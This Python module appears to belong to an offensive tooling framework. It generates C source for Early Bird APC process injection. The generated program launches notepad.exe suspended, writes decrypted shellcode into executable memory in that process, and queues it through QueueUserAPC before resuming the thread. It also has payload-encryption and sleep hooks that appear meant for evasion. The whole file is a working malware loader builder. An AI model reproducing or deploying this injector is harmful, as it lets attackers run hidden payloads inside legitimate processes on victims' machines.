#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""C source generator for Early Bird APC injection."""

from __future__ import annotations

from lib.compile.injection_common import InjectionBuilder


class EarlyBirdBuilder(InjectionBuilder):
    def build_source(
        self,
        encoded_payload: str,
        key: bytes,
        iv=None,
        *,
        target_path: str = r"C:\Windows\System32\notepad.exe",
    ) -> str:
        target = target_path.replace("\\", "\\\\").replace('"', '\\"')
        return f"""
{chr(10).join(self.headers())}

char* enc_payload = "{encoded_payload}";
char* target_process = "{target}";

static BOOL early_bird_inject(PBYTE shellcode, SIZE_T size)
{{
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    PVOID remote = NULL;

    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);

    if (!CreateProcessA(target_process, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
        return FALSE;

    remote = VirtualAllocEx(pi.hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remote) goto cleanup;

    if (!WriteProcessMemory(pi.hProcess, remote, shellcode, size, NULL))
        goto cleanup;

    if (QueueUserAPC((PAPCFUNC)remote, pi.hThread, 0) == 0)
        goto cleanup;

    {self.sleep_block()}
    ResumeThread(pi.hThread);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return TRUE;

cleanup:
    if (pi.hThread) CloseHandle(pi.hThread);
    if (pi.hProcess) TerminateProcess(pi.hProcess, 1);
    if (pi.hProcess) CloseHandle(pi.hProcess);
    return FALSE;
}}

int main(void)
{{
{self.decode_preamble()}
{self.decrypt_block(key, iv)}
    if (!early_bird_inject(shellcode_buf, payload_size)) return 1;
    VirtualFree(shellcode_buf, 0, MEM_RELEASE);
    free(decoded);
    return 0;
}}
"""
